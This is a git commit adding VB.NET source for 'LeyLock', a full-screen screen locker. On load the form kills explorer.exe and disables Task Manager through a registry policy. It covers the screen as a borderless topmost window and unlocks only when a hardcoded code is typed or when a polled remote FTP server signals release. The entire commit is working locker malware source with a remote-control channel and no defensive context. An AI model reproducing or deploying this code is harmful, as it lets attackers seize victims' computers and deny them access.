6a9db40397623341f1b52346e92df3d49d172c6f
Sami Rahman <srsami707@gmail.com>
2024-01-30 04:06:00 -0800

    Add files via upload

---
+++ v3/ftpup/leylock.Designer.vb
@@ -0,0 +1,74 @@
+﻿<Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
+Partial Class leylock
+    Inherits System.Windows.Forms.Form
+
+    'Form overrides dispose to clean up the component list.
+    <System.Diagnostics.DebuggerNonUserCode()> _
+    Protected Overrides Sub Dispose(ByVal disposing As Boolean)
+        Try
+            If disposing AndAlso components IsNot Nothing Then
+                components.Dispose()
+            End If
+        Finally
+            MyBase.Dispose(disposing)
+        End Try
+    End Sub
+
+    'Required by the Windows Form Designer
+    Private components As System.ComponentModel.IContainer
+
+    'NOTE: The following procedure is required by the Windows Form Designer
+    'It can be modified using the Windows Form Designer.  
+    'Do not modify it using the code editor.
+    <System.Diagnostics.DebuggerStepThrough()> _
+    Private Sub InitializeComponent()
+        Me.components = New System.ComponentModel.Container()
+        Dim resources As System.ComponentModel.ComponentResourceManager = New System.ComponentModel.ComponentResourceManager(GetType(leylock))
+        Me.locker = New System.Windows.Forms.Timer(Me.components)
+        Me.TextBox1 = New System.Windows.Forms.TextBox()
+        Me.SuspendLayout()
+        '
+        'locker
+        '
+        Me.locker.Enabled = True
+        Me.locker.Interval = 2000
+        '
+        'TextBox1
+        '
+        Me.TextBox1.BorderStyle = System.Windows.Forms.BorderStyle.FixedSingle
+        Me.TextBox1.Cursor = System.Windows.Forms.Cursors.IBeam
+        Me.TextBox1.Dock = System.Windows.Forms.DockStyle.Bottom
+        Me.TextBox1.Font = New System.Drawing.Font("Microsoft Sans Serif", 26.18182!, System.Drawing.FontStyle.Bold)
+        Me.TextBox1.Location = New System.Drawing.Point(0, 393)
+        Me.TextBox1.Name = "TextBox1"
+        Me.TextBox1.Size = New System.Drawing.Size(800, 57)
+        Me.TextBox1.TabIndex = 0
+        Me.TextBox1.TextAlign = System.Windows.Forms.HorizontalAlignment.Center
+        '
+        'leylock
+        '
+        Me.AutoScaleDimensions = New System.Drawing.SizeF(8.0!, 16.0!)
+        Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
+        Me.BackgroundImage = CType(resources.GetObject("$this.BackgroundImage"), System.Drawing.Image)
+        Me.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Stretch
+        Me.ClientSize = New System.Drawing.Size(800, 450)
+        Me.ControlBox = False
+        Me.Controls.Add(Me.TextBox1)
+        Me.Cursor = System.Windows.Forms.Cursors.No
+        Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None
+        Me.MinimizeBox = False
+        Me.Name = "leylock"
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen
+        Me.Text = "LeyLock"
+        Me.TopMost = True
+        Me.WindowState = System.Windows.Forms.FormWindowState.Maximized
+        Me.ResumeLayout(False)
+        Me.PerformLayout()
+
+    End Sub
+
+    Friend WithEvents locker As Timer
+    Friend WithEvents TextBox1 As TextBox
+End Class
---
+++ v3/ftpup/leylock.vb
@@ -0,0 +1,55 @@
+﻿Imports System.IO
+Imports System.Net
+
+Public Class leylock
+    Dim userpanel As String = My.Settings.userpanel
+    Dim panelpass As String = My.Settings.panelpass
+    Private Sub leylock_Load(sender As Object, e As EventArgs) Handles MyBase.Load
+        Shell("taskkill /f /im explorer.exe")
+        Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f")
+        Me.TopMost = True
+        Me.WindowState = FormWindowState.Maximized
+        Me.ShowIcon = False
+        Me.ShowInTaskbar = False
+        Me.Cursor = Cursors.No
+        locker.Start()
+    End Sub
+    Private Sub TextBox1_TextChanged(sender As Object, e As EventArgs) Handles TextBox1.TextChanged
+        If TextBox1.Text = "12345" Then
+            Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
+            Process.Start("explorer")
+            Me.Close()
+        End If
+    End Sub
+
+    Private Sub locker_Tick(sender As Object, e As EventArgs) Handles locker.Tick
+        unlockdev()
+    End Sub
+
+    Private Sub unlockdev()
+
+
+        Try
+            Dim mReq As System.Net.FtpWebRequest = DirectCast(System.Net.WebRequest.Create("ftp://ftp.leylance.xyz/procedures/evnjlvnfvbasbscudvudunlckodvbsdkjvsdvjsdvjsdkjvndvjndsjvndsvnsdvlnsdklvnsdkvnsdkvn/unlcko.llance"), System.Net.FtpWebRequest)
+            mReq.Credentials = New System.Net.NetworkCredential("u945780831." + userpanel, panelpass)
+            mReq.Method = System.Net.WebRequestMethods.Ftp.GetFileSize
+            'My.Computer.Network.DownloadFile("ftp://ftp.leylance.xyz/procedures/evnjlvnfvbasbscudvudunlckodvbsdkjvsdvjsdvjsdkjvndvjndsjvndsvnsdvlnsdklvnsdkvnsdkvn/unlcko.llance", "unlcko.llance", "u945780831." + userpanel, panelpass)
+            'mReq.Credentials = New System.Net.NetworkCredential("u945780831." + userpanel, panelpass)
+            mReq.Method = System.Net.WebRequestMethods.Ftp.DeleteFile
+            mReq.GetResponse()
+            unlck()
+        Catch ex As WebException
+            Dim checkreq As FtpWebResponse = ex.Response
+            If FtpStatusCode.ActionNotTakenFileUnavailable = checkreq.StatusCode Then
+
+            End If
+        End Try
+    End Sub
+    Private Sub unlck()
+        locker.Stop()
+        Shell("REG add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 0 /f")
+        Process.Start("explorer")
+        Me.Close()
+    End Sub
+
+End Class
